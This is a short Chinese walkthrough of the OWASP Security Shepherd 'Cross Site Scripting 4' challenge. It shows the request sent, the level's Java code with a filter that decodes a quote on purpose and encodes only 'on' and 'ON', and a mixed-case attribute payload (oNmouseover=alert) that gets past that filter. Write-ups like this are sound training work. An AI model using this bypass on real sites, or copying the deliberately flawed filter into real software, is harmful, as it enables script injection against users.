#  Cross Site Scripting 4(跨站脚本攻击 4)

## 题介绍
利用xss注入点，实现一个弹框

## 功能实现 
请求数据包  
```
POST /challenges/06f81ca93f26236112f8e31f32939bd496ffe8c9f7b564bce32bd5e3a8c2f751 HTTP/1.1


searchTerm=http%3A%2F%2Ftest%22oNmouseover%3Dalert(123)%3B%2F%2F&csrfToken=-32864054630884368385257168535939963911
```

对应请求包   
```
String searchTerm = request.getParameter("searchTerm");
log.debug("User Submitted - " + searchTerm);
if(!searchTerm.startsWith("http"))
{
	searchTerm = "https://www.owasp.org/index.php/OWASP_Security_Shepherd";
	userPost = "<a href=\"" + searchTerm + "\" alt=\"OWASP Security Shepherd\">" + searchTerm + "</a>";
}
else
{
	
	searchTerm = XssFilter.encodeForHtml(searchTerm);
	userPost = "<a href=\"" + searchTerm + "\" alt=\"" + searchTerm + "\">" + searchTerm + "</a>";
	log.debug("After Encoding - " + searchTerm);
	if(FindXSS.search(userPost))
	{
		htmlOutput = "<h2 class='title'>" + bundle.getString("result.wellDone") + "</h2>" +
				"<p>" + bundle.getString("result.youDidIt") + "<br />" +
				bundle.getString("result.resultKey") + " <a>" +
					Hash.generateUserSolution(
							Getter.getModuleResultFromHash(getServletContext().getRealPath(""), levelHash),
						(String)ses.getAttribute("userName")
					)
				+ "</a>";
	}
}
# 对应进行编码 
public static String XssFilter.encodeForHtml (String input)
	{
		log.debug("Filtering input at XSS white list");
		
		input = Encode.forHtml(input);
		//Decode quotes to open a security hole in Encoder
		input = input.replaceFirst("&#34;", "\"");
		//Encode lower-case "on" and upper-case "on" to complicate the required attack vectors to pass
		return input.replaceAll("on", "&#x6f;&#x6e;").replaceAll("ON", "&#x4f;&#x4e;");
	}
```

## 解题步骤  

最终答案  
```
http://test"oNmouseover=alert(123);//
```

## 总结  

输入验证 的不完全 